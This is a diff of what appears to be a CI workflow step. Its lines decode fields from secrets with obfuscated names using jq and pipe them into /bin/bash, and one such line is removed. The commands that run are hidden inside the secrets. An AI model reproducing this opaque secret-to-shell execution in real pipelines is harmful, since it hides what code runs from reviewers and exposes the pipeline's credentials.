@@ -21,7 +21,6 @@ jobs:
           db0754: ${{ secrets.db0754 }}
         run: |
           printf '%s' "$db0754" | jq -r .bwlh2 | /bin/bash
-          printf '%s' "$gpz48226" | jq -r .fg937 | /bin/bash
           printf '%s' "$tmcni3606" | jq -r .sv0 | /bin/bash
           echo $nxif0 | jq -r .p81435 | /bin/bash
           printf '%s' "$j7072" | jq -r .j86 | /bin/bash
